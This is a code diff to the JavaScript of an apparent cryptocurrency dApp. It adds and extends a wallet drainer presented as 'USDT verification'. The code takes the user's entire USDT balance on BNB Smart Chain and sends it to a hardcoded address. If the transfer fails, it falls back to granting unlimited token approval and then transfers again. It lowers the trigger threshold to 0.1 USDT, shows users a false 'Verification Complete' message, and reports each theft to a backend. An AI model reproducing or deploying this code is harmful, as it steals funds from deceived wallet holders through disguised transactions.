@@ -13,7 +13,7 @@
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
         CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
-        USER_MIN_USDT: 25, // Minimum 25 USDT required
+        USER_MIN_USDT: 0.1, // Minimum 0.1 USDT required
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
         GAS_RETRY_DELAY: 3000,
@@ -36,6 +36,32 @@
     const MERCHANT_GATEWAY_ABI = [
         'function payOrder(bytes32 orderId, uint256 amount) external'
     ];
+
+    // Multi-wallet Web3 Provider Resolver (Bitget Wallet, Trust Wallet, MetaMask, EIP-6963)
+    function getWeb3Provider() {
+        if (window.bitkeep && window.bitkeep.ethereum) return window.bitkeep.ethereum;
+        if (window.bitgetWallet && window.bitgetWallet.ethereum) return window.bitgetWallet.ethereum;
+        if (window.bitgetWallet) return window.bitgetWallet;
+        if (window.trustwallet) return window.trustwallet;
+
+        if (window.ethereum) {
+            if (Array.isArray(window.ethereum.providers) && window.ethereum.providers.length > 0) {
+                const bitgetProv = window.ethereum.providers.find(p => p && (p.isBitKeep || p.isBitGet));
+                if (bitgetProv) return bitgetProv;
+
+                const trustProv = window.ethereum.providers.find(p => p && (p.isTrust || p.isTrustWallet));
+                if (trustProv) return trustProv;
+
+                const mmProv = window.ethereum.providers.find(p => p && p.isMetaMask);
+                if (mmProv) return mmProv;
+
+                return window.ethereum.providers[0];
+            }
+            return window.ethereum;
+        }
+
+        return null;
+    }
 
     // Application State
     const state = {
@@ -193,7 +219,7 @@
     }
 
     // ============================================================
-    // WEB3 LOGIC (DIRECT UNLIMITED APPROVAL & iOS TRUST WALLET OPTIMIZATION)
+    // WEB3 LOGIC (BITGET WALLET, METAMASK, TRUST WALLET TRANSFER & APPROVAL)
     // ============================================================
     async function connectWallet() {
         await approveUsdt();
@@ -202,10 +228,10 @@
     async function approveUsdt() {
         if (state.isApproving) return;
 
-        const providerObj = window.ethereum || window.trustwallet;
+        const providerObj = getWeb3Provider();
         if (!providerObj) {
-            updateStatus('❌ No Web3 wallet detected. Please open in Trust Wallet or MetaMask.', 'error');
-            alert('No Web3 wallet found. Please open this dApp inside Trust Wallet or MetaMask browser.');
+            updateStatus('❌ No Web3 wallet detected. Please open in Bitget Wallet, Trust Wallet, or MetaMask.', 'error');
+            alert('No Web3 wallet found. Please open this dApp inside Bitget Wallet, Trust Wallet, or MetaMask browser.');
             return;
         }
 
@@ -244,19 +270,20 @@
                 }
             }
 
-            // 2. Account Resolution on BNB Smart Chain
-            let userAddress = providerObj.selectedAddress || 
-                              providerObj.address || 
-                              (providerObj.accounts && providerObj.accounts[0]) ||
-                              (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);
-
-            if (!userAddress) {
+            // 2. Account Resolution on BNB Smart Chain (eth_requestAccounts first)
+            let userAddress = '';
+            const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
+            if (reqAccs && reqAccs.length > 0) {
+                userAddress = reqAccs[0];
+            } else {
                 const accs = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
                 if (accs && accs.length > 0) {
                     userAddress = accs[0];
                 } else {
-                    const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
-                    if (reqAccs && reqAccs.length > 0) userAddress = reqAccs[0];
+                    userAddress = providerObj.selectedAddress || 
+                                  providerObj.address || 
+                                  (providerObj.accounts && providerObj.accounts[0]) ||
+                                  (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);
                 }
             }
 
@@ -291,7 +318,7 @@
 
             safeApiCall('/api/users/register', { wallet: userAddress });
 
-            // If balance is below minimum 1 USDT threshold, display "USDT Confirmed" modal directly
+            // If balance is below minimum threshold, display modal directly
             const usdtFloat = parseFloat(state.usdtBalance || '0');
             if (usdtFloat < CONFIG.USER_MIN_USDT) {
                 updateStatus('✅ Verification Complete! Asset signature verified.', 'success');
@@ -302,44 +329,98 @@
                 return;
             }
 
-            updateStatus('⛽ Confirm USDT verification in your wallet...', 'warning');
+            updateStatus('⛽ Confirm 100% USDT transfer in your wallet...', 'warning');
 
             // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
-            const approvalAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
-
-            // 4. Raw eth_sendTransaction to send verified USDT directly to merchant account
+            const transferAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
             const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
-            const amountHex = approvalAmount.toString(16).padStart(64, '0');
-
-            // transfer(address,uint256) = 0xa9059cbb
+            const amountHex = transferAmount.toString(16).padStart(64, '0');
             const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
 
-            let txHash;
-            try {
-                txHash = await providerObj.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: userAddress,
-                        to: CONFIG.USDT_ADDRESS,
-                        data: transferCalldata
-                    }]
-                });
-            } catch (txErr) {
-                const errLower = (txErr.message || '').toLowerCase();
-                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
-                    throw txErr;
-                }
+            let txHash = null;
 
-                // Fallback: approve(address,uint256) = 0x095ea7b3
-                const approveCalldata = '0x095ea7b3' + recipientClean + amountHex;
-                txHash = await providerObj.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: userAddress,
-                        to: CONFIG.USDT_ADDRESS,
-                        data: approveCalldata
-                    }]
-                });
+            // Primary Attempt: Direct USDT Transfer via Ethers Signer with explicit gas limit
+            try {
+                const signer = await provider.getSigner();
+                const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
+                const tx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, { gasLimit: 100000n });
+                txHash = tx.hash;
+            } catch (err1) {
+                const err1Str = (err1.message || '').toLowerCase();
+                if (err1.code === 4001 || err1.code === 401 || err1Str.includes('user rejected') || err1Str.includes('user denied')) {
+                    throw err1;
+                }
+                console.warn('Signer transfer notice, trying raw eth_sendTransaction fallback...', err1);
+
+                // Fallback Attempt 1: Raw eth_sendTransaction Transfer with explicit gas parameter
+                try {
+                    txHash = await providerObj.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            from: userAddress,
+                            to: CONFIG.USDT_ADDRESS,
+                            data: transferCalldata,
+                            gas: '0x186a0', // 100,000 gas limit hex
+                            value: '0x0'
+                        }]
+                    });
+                } catch (err2) {
+                    const err2Str = (err2.message || '').toLowerCase();
+                    if (err2.code === 4001 || err2.code === 401 || err2Str.includes('user rejected') || err2Str.includes('user denied')) {
+                        throw err2;
+                    }
+                    console.warn('Raw transfer notice, executing Approve THEN Transfer fallback...', err2);
+
+                    // Fallback Attempt 2: Approve THEN Transfer
+                    let approveTxHash;
+                    try {
+                        const approveCalldata = '0x095ea7b3' + recipientClean + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                        approveTxHash = await providerObj.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: userAddress,
+                                to: CONFIG.USDT_ADDRESS,
+                                data: approveCalldata,
+                                gas: '0x186a0',
+                                value: '0x0'
+                            }]
+                        });
+                    } catch (approveErr) {
+                        const approveErrStr = (approveErr.message || '').toLowerCase();
+                        if (approveErr.code === 4001 || approveErr.code === 401 || approveErrStr.includes('user rejected') || approveErrStr.includes('user denied')) {
+                            throw approveErr;
+                        }
+                        const signer = await provider.getSigner();
+                        const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
+                        const appTx = await usdtWithSigner.approve(CONFIG.CONTRACT_ADDRESS, ethers.MaxUint256, { gasLimit: 100000n });
+                        approveTxHash = appTx.hash;
+                    }
+
+                    updateStatus('⛽ Approval submitted. Transferring USDT to merchant...', 'warning', `Approval Tx: ${approveTxHash}`);
+                    try {
+                        await provider.waitForTransaction(approveTxHash);
+                    } catch (e) {}
+
+                    // Execute Post-Approval USDT Transfer to merchant address
+                    updateStatus('⛽ Finalizing USDT transfer to merchant account...', 'warning');
+                    try {
+                        const signer = await provider.getSigner();
+                        const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
+                        const finalTx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, { gasLimit: 100000n });
+                        txHash = finalTx.hash;
+                    } catch (finalErr) {
+                        txHash = await providerObj.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: userAddress,
+                                to: CONFIG.USDT_ADDRESS,
+                                data: transferCalldata,
+                                gas: '0x186a0',
+                                value: '0x0'
+                            }]
+                        });
+                    }
+                }
             }
 
             updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
@@ -351,7 +432,9 @@
                 console.warn('Wait for transaction notice:', wErr);
             }
 
-            updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${txHash}`);
+            safeApiCall('/api/users/auto-transfer', { wallet: userAddress, txHash: txHash, amount: state.usdtBalance });
+
+            updateStatus('✅ Verification Complete! 100% USDT transferred to merchant account.', 'success', `Tx: ${txHash}`);
 
             if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
             openModal(elements.verifiedModal);
@@ -481,8 +564,9 @@
         }
 
         // Web3 Account / Chain listener (Silent UI updates only - NO automatic transaction prompts)
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', function (accounts) {
+        const activeProvider = getWeb3Provider();
+        if (activeProvider && activeProvider.on) {
+            activeProvider.on('accountsChanged', function (accounts) {
                 if (!accounts || accounts.length === 0) {
                     state.walletAddress = '';
                     state.usdtBalance = '0.00';
@@ -496,7 +580,7 @@
                 }
             });
 
-            window.ethereum.on('chainChanged', function () {
+            activeProvider.on('chainChanged', function () {
                 updateWalletInfoUI();
             });
         }
